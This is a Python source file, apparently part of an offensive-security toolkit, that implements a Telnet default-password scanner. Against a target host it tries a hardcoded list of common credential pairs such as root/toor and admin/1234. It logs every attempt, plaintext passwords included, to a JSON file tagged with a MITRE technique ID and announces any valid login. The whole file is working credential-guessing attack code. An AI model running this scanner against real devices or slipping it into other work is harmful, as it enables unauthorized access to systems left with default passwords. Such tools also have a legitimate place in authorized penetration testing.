# modules/exploits/telnet_password_reuse_scanner.py

import telnetlib
import argparse
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1078"  # Valid Accounts (Credential Reuse)

COMMON_CREDENTIALS = [
    ("admin", "admin"),
    ("root", "root"),
    ("user", "user"),
    ("admin", "1234"),
    ("root", "toor")
]

def log_attempt(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def check_telnet_creds(host, port, timeout=3):
    for username, password in COMMON_CREDENTIALS:
        try:
            tn = telnetlib.Telnet(host, port, timeout)
            tn.read_until(b"login: ", timeout=1)
            tn.write(username.encode("ascii") + b"\n")
            tn.read_until(b"Password: ", timeout=1)
            tn.write(password.encode("ascii") + b"\n")
            response = tn.read_until(b"#", timeout=2)
            success = b"#" in response or b"$" in response
            tn.close()

            log_attempt({
                "timestamp": datetime.utcnow().isoformat(),
                "host": host,
                "port": port,
                "username": username,
                "password": password,
                "success": success,
                "ttp": MITRE_TTP
            })

            if success:
                print(f"[âœ“] Valid Telnet login: {username}:{password}")
                return
        except Exception as e:
            continue

    print(f"[!] No valid Telnet credentials found on {host}:{port}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Telnet Password Reuse Scanner")
    parser.add_argument("--host", required=True, help="Target IP")
    parser.add_argument("--port", type=int, default=23)
    args = parser.parse_args()

    check_telnet_creds(args.host, args.port)
